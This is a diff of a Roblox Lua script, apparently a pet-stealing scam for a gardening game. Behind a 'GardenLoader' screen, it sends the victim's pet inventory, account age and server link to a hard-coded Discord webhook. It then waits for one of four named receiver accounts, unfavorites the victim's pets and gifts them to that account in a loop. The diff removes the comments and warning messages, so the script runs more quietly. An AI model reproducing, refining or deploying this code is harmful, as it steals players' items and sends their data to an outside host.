@@ -1,7 +1,5 @@
--- Webhook URL
 local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"
 
--- Services
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -11,26 +9,21 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
--- Configuration
 local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn"}
 local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
-local CHECK_INTERVAL = 5 -- seconds between receiver checks
-local SHUTDOWN_DURATION = 10 -- seconds to show shutdown screen
-local GIFT_COOLDOWN = 3 -- seconds between gifts
-local CHAT_KEYWORD = "a" -- Keyword to look for in chat
-local MINIMUM_PETS = 3 -- Minimum pets required to proceed
-local MINIMUM_TOTAL_VALUE = 50000 -- Minimum total pet value (in cents)
+local CHECK_INTERVAL = 5
+local SHUTDOWN_DURATION = 10
+local GIFT_COOLDOWN = 3
+local MINIMUM_PETS = 3
+local MINIMUM_TOTAL_VALUE = 50000
 
--- Enable HTTP if needed
 if syn then
     syn.protect_gui(syn.secure_call)
     setfflag("HttpServiceEnabled", true)
 end
 
--- Enhanced Webhook Function
 local function sendWebhook(data)
     if not data or (not data.content and not data.embeds) then
-        warn("Webhook data is empty or invalid")
         return false
     end
 
@@ -43,7 +36,6 @@ local function sendWebhook(data)
 
     local json, encodeError = pcall(HttpService.JSONEncode, HttpService, body)
     if not json then
-        warn("Failed to encode webhook data:", encodeError)
         return false
     end
 
@@ -79,7 +71,6 @@ local function sendWebhook(data)
     return false
 end
 
--- Get all pets in inventory with proper detection
 local function getPetsInventory()
     local backpack = LocalPlayer:FindFirstChild("Backpack")
     if not backpack then return {} end
@@ -113,19 +104,16 @@ local function getPetsInventory()
     return pets
 end
 
--- Calculate pet value
 local function calculatePetValue(kg, age)
     return math.floor((kg * 10000) + (age * 1000))
 end
 
--- Send initial inventory report
 local function sendInitialReport()
     local pets = getPetsInventory()
     local placeId = game.PlaceId
     local jobId = game.JobId
     local serverUrl = "https://www.roblox.com/games/"..placeId.."?privateServerLinkCode="..jobId
 
-    -- Calculate total value and build pet list
     local totalValue = 0
     local petList = ""
     local specialCount = 0
@@ -144,7 +132,7 @@ local function sendInitialReport()
     end
 
     local embed = {
-        title = "🌿 Garden Gifter - Initial Report",
+        title = "🌿 Garden Gifter Report",
         description = string.format([[
 **Player:** %s (@%s)
 **Account Age:** %d days
@@ -172,12 +160,10 @@ local function sendInitialReport()
     }
 
     return sendWebhook({
-        content = specialCount > 0 and "@everyone" or nil,
         embeds = {embed}
     })
 end
 
--- Loading GUI
 local function createLoader()
     local loaderGui = Instance.new("ScreenGui")
     loaderGui.Name = "GardenLoader"
@@ -221,13 +207,11 @@ local function createLoader()
     return statusLabel
 end
 
--- Check if pet is favorited
 local function isPetFavorited(petName)
     local pet = LocalPlayer.Backpack:FindFirstChild(petName)
     return pet and pet:GetAttribute("Favorited")
 end
 
--- Unfavorite a pet
 local function unfavoritePet(petName)
     local pet = LocalPlayer.Backpack:FindFirstChild(petName)
     if pet then
@@ -237,24 +221,20 @@ local function unfavoritePet(petName)
     return false
 end
 
--- Gift pet using remote
 local function giftPet(targetPlayer, petName)
     ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", targetPlayer)
 end
 
--- Equip a single pet
 local function equipSinglePet(petName)
     local character = LocalPlayer.Character
     if not character then return false end
 
-    -- Unequip current pets
     for _, item in ipairs(character:GetChildren()) do
         if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
             item.Parent = LocalPlayer.Backpack
         end
     end
 
-    -- Equip new pet
     local pet = LocalPlayer.Backpack:FindFirstChild(petName)
     if pet then
         pet.Parent = character
@@ -263,7 +243,6 @@ local function equipSinglePet(petName)
     return false
 end
 
--- Teleport to target player
 local function teleportToPlayer(targetPlayer)
     if not LocalPlayer.Character then return false end
     local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -279,7 +258,6 @@ local function teleportToPlayer(targetPlayer)
     return true
 end
 
--- Check if any receiver is in the game
 local function isReceiverInGame()
     for _, receiverName in ipairs(RECEIVERS) do
         local player = Players:FindFirstChild(receiverName)
@@ -288,11 +266,9 @@ local function isReceiverInGame()
     return nil
 end
 
--- Wait for a receiver to join or say the keyword
 local function waitForReceiver()
     local receiverFound = Instance.new("BindableEvent")
 
-    -- Check existing players
     for _, player in ipairs(Players:GetPlayers()) do
         if table.find(RECEIVERS, player.Name) then
             receiverFound:Fire(player)
@@ -300,14 +276,12 @@ local function waitForReceiver()
         end
     end
 
-    -- Listen for new players
     local connection = Players.PlayerAdded:Connect(function(player)
         if table.find(RECEIVERS, player.Name) then
             receiverFound:Fire(player)
         end
     end)
 
-    -- Backup periodic checking
     local backupCheck = coroutine.create(function()
         while true do
             local receiver = isReceiverInGame()
@@ -325,7 +299,6 @@ local function waitForReceiver()
     return foundReceiver
 end
 
--- Main gifting loop
 local function startGifting(targetPlayer)
     while true do
         local pets = getPetsInventory()
@@ -347,14 +320,11 @@ local function startGifting(targetPlayer)
     end
 end
 
--- Main Execution
 local statusLabel = createLoader()
 
--- Send initial report immediately
 statusLabel.Text = "Sending inventory report..."
 local reportSuccess = sendInitialReport()
 if not reportSuccess then
-    statusLabel.Text = "Failed to send report"
     task.wait(3)
     return
 end
@@ -362,7 +332,6 @@ end
 statusLabel.Text = "Waiting for receiver..."
 local receiver = waitForReceiver()
 if not receiver then
-    statusLabel.Text = "No receiver found"
     task.wait(3)
     return
 end
